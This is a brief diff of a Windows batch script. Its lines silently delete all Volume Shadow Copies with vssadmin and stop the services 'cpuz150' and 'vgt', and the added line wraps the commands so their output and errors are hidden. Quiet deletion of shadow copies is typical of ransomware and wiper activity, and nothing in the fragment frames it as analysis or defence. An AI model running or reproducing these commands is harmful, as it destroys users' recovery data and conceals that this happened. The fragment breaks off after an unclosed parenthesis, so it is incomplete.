@@ -1,4 +1,5 @@
 @echo off
+>nul 2>&1 (
 vssadmin delete shadows /all /Quiet
 sc stop cpuz150
 sc stop vgt
